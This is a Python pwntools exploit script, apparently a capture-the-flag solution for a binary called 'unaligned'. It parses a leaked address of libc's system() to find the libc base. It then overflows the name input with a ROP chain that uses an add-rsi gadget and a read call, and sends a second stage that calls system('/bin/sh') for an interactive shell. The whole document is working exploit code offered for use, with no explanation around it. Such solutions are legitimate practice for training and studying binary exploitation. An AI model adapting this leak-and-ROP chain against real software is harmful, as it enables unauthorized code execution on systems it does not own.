#!/usr/bin/env python3

from pwn import *

exe = ELF("./unaligned")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

if not args.REMOTE:
    libc = exe.libc

HOST, PORT = "localhost", 1337

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True

ONE_GADGETS = [0x4f2a5, 0x4f302, 0x10a2fc]

# Lambdas

b = lambda s: s.encode()
one_gadget = lambda i: libc.address + ONE_GADGETS[i]

def main():
    global io

    io = conn()

    # Get leak

    io.recvuntil(b"Gift: ")
    buf = io.recvline(keepends=False)
    system_leak = pack(int(buf, 16))
    libc.address = leak(system_leak, libc.sym.system, "libc", verbose=True)

    # ROP to shell

    roplibc = ROP(libc)
    pop_rdi = roplibc.rdi.address
    ret = roplibc.ret.address
    # 0x0000000000131c03 : add rsi, qword ptr [rbp - 0x6b] ; mov rax, rdi ; ret
    add_rsi = libc.address + 0x0000000000131c03

    io.recvuntil(b"Name: ")
    # libc base address + 0x20 points to this value: 0x0000000000000040
    rbp = libc.address + 0x20 + 0x6b
    payload = flat(
        b"B" * 0x20,
        rbp,
        add_rsi,
        libc.sym.read,
        add_rsi,
    )
    # pause()
    io.send(payload)

    payload = flat(
        pop_rdi,
        next(libc.search(b"/bin/sh\0")),
        libc.sym.system,
    )
    # pause()
    io.send(payload)

    io.interactive()

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
